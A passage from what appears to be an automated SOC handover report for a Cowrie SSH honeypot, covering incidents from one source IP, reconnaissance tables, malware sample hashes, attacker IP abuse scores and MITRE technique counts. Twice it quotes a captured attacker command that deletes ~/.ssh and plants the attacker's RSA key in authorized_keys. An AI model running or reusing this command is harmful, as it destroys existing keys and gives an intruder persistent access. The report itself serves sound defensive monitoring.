| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 11:01:27` | `cowrie.session.connect` |
| `2026-05-01 11:01:27` | `cowrie.client.version` |
| `2026-05-01 11:01:27` | `cowrie.client.kex` |
| `2026-05-01 11:01:28` | `cowrie.login.success` |
| `2026-05-01 11:01:28` | `cowrie.session.params` |
| `2026-05-01 11:01:28` | `cowrie.command.input` |
| `2026-05-01 11:01:28` | `cowrie.command.failed` |
| `2026-05-01 11:01:28` | `cowrie.log.closed` |
| `2026-05-01 11:01:28` | `cowrie.session.params` |
| `2026-05-01 11:01:28` | `cowrie.command.input` |
| `2026-05-01 11:01:28` | `cowrie.session.file_download` |
| `2026-05-01 11:01:28` | `cowrie.log.closed` |
| `2026-05-01 11:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e3a71ead10a

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 11:01 |
| **Last Seen** | 2026-05-01 11:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 11:01:31` | `cowrie.session.connect` |
| `2026-05-01 11:01:31` | `cowrie.client.version` |
| `2026-05-01 11:01:31` | `cowrie.client.kex` |
| `2026-05-01 11:01:31` | `cowrie.login.success` |
| `2026-05-01 11:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dfe5f79c489

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 11:02 |
| **Last Seen** | 2026-05-01 11:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 11:02:16` | `cowrie.session.connect` |
| `2026-05-01 11:02:16` | `cowrie.client.version` |
| `2026-05-01 11:02:17` | `cowrie.client.kex` |
| `2026-05-01 11:02:17` | `cowrie.login.success` |
| `2026-05-01 11:02:17` | `cowrie.session.params` |
| `2026-05-01 11:02:17` | `cowrie.command.input` |
| `2026-05-01 11:02:17` | `cowrie.command.failed` |
| `2026-05-01 11:02:18` | `cowrie.log.closed` |
| `2026-05-01 11:02:18` | `cowrie.session.params` |
| `2026-05-01 11:02:18` | `cowrie.command.input` |
| `2026-05-01 11:02:18` | `cowrie.session.file_download` |
| `2026-05-01 11:02:18` | `cowrie.log.closed` |
| `2026-05-01 11:02:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03484e312941

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 11:02 |
| **Last Seen** | 2026-05-01 11:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 11:02:20` | `cowrie.session.connect` |
| `2026-05-01 11:02:20` | `cowrie.client.version` |
| `2026-05-01 11:02:20` | `cowrie.client.kex` |
| `2026-05-01 11:02:21` | `cowrie.login.success` |
| `2026-05-01 11:02:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.78.174[.]50` | **32** | 2026-05-01 10:19 | 2026-05-01 10:20 | 6m | 4 | `T1110.001` | 🟠 MEDIUM |
| `35.187.79[.]99` | **32** | 2026-05-01 09:56 | 2026-05-01 09:56 | 4m | 4 | `T1110.001` | 🟠 MEDIUM |
| `135.125.226[.]120` | **30** | 2026-05-01 10:39 | 2026-05-01 11:03 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `170.238.160[.]191` | **30** | 2026-05-01 10:12 | 2026-05-01 10:43 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.74.128[.]226` | **2** | 2026-05-01 10:17 | 2026-05-01 10:19 | 2m | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | **2** | 2026-05-01 10:55 | 2026-05-01 10:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.48.76[.]190` | 1 | 2026-05-01 10:00 | 2026-05-01 10:02 | 80s | 0 | `T1592` | 🟢 LOW |
| `159.223.94[.]92` | 1 | 2026-05-01 10:09 | 2026-05-01 10:09 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.180.141[.]4` | 1 | 2026-05-01 10:09 | 2026-05-01 10:09 | 4s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (25 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 40/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `35.187.79[.]99` | BE | Google LLC | **100** ⚠️ | 2 |
| `34.78.174[.]50` | BE | Google LLC | **100** ⚠️ | 1 |
| `135.125.226[.]120` | DE | OVH GmbH | **100** ⚠️ | 0 |
| `3.129.187[.]38` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `159.223.94[.]92` | SG | DigitalOcean, LLC | **100** ⚠️ | 39 |
| `185.180.141[.]4` | US | ICG-1-ZEN-DFW | **100** ⚠️ | 50 |
| `170.238.160[.]191` | BR | NCS-Fibra ( New Central Solutions ) | **100** ⚠️ | 50 |
| `120.48.76[.]190` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `106.74.128[.]226` | CN | CHINA UNICOM CLOUD DATA COMPANY LIMITED | **100** ⚠️ | 26 |
| `45.23.213[.]116` | US | AT&T Enterprises, LLC | **57** | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 113 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 67 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 50 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 25 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 25 |

---

## 🔕 False Positive Summary (320 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 312 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 501 cases |
| Tool 34  | Credential Extractor        | ✅ 119 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 20 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 320 filtered (63.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 25 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 50 priority case(s) shown individually · 9 recon entry/entries in table (6 group(s) consolidating 128 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-01T11:10:41Z_
